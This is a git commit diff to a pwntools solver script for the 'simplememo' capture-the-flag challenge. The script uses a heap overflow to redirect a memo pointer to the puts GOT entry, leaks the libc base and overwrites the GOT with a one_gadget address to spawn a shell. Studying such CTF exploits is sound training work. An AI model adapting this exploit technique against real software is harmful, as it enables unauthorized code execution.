5a3a56f3b649885142f2320b2b47b3cc2b196cdf
hayato0909 <hayato8810_0610@yahoo.co.jp>
2023-12-18 10:17:41 +0900

    modify solver

--- ctf4b2022/simplememo/solve.py
+++ ctf4b2022/simplememo/solve.py
@@ -1,8 +1,11 @@
 from pwn import *
 
 elf = ELF('./chall')
+libc = ELF('./libc.so.6')
 io = process(elf.path)
 context.binary = elf
+
+one_gadget = [0xe3afe, 0xe3b01, 0xe3b04]
 
 # create 2 memos
 io.sendlineafter(b'> ', b'1')
@@ -17,27 +20,23 @@ io.sendlineafter(b'Content: ', b'test2')
 log.info(f'memo1: {hex(memo1)}')
 log.info(f'memo2: {hex(memo2)}')
 
-# edit memo2 next pointer to GOT printf
+# edit memo2 next pointer to GOT puts
 payload = b'a' * (memo2 - memo1 - 8)
-payload += p64(elf.got['exit'] - 8)
+payload += p64(elf.got['puts'] - 8)
 io.sendlineafter(b'> ', b'2')
 io.sendlineafter(b'index: ', b'0')
 io.sendlineafter(b'New content: ', payload)
 
-# make rop chain to leak libc
-rop = ROP(elf)
-rop.puts(elf.got['puts'])
-rop.main()
-io.sendlineafter(b'> ', b'2')
-io.sendlineafter(b'index: ', b'0')
-io.sendlineafter(b'New content: ', rop.chain())
-
-# GOT overwrite
+# get puts GOT address
 io.sendlineafter(b'> ', b'2')
 io.sendlineafter(b'index: ', b'2')
-io.sendlineafter(b'New content: ', p64(memo1 + 8))
+io.recvuntil(b'editing memo at 0x')
+puts_got = int(io.recvline().strip(), 16)
+libc_base = puts_got - libc.symbols['puts']
+log.info(f'libc_base: {hex(libc_base)}')
 
-io.sendlineafter(b'> ', b'4')
+# GOT overwrite
+io.sendlineafter(b'New content: ', p64(libc_base + one_gadget[2]))
 
 io.interactive()
 
